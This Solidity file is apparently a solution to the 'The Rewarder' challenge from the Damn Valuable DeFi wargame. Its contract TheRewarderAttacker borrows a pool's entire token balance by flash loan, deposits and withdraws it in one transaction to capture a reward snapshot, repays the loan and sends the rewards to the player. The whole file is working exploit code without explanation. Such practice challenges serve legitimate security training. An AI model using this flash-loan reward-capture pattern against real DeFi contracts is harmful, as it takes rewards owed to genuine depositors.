// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttacker {

    address public immutable player;
    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable loanerPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor(address _rewarderPool, address _loanerPool) {
        player = msg.sender;
        rewarderPool = TheRewarderPool(_rewarderPool);
        loanerPool = FlashLoanerPool(_loanerPool);
        liquidityToken =  DamnValuableToken(rewarderPool.liquidityToken());
        rewardToken = RewardToken(rewarderPool.rewardToken());
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(loanerPool), amount);
    }

    function attack() external {
        loanerPool.flashLoan(
            liquidityToken.balanceOf(address(loanerPool))
        );
        rewardToken.transfer(
            player, 
            rewardToken.balanceOf(address(this))
        );
    }
}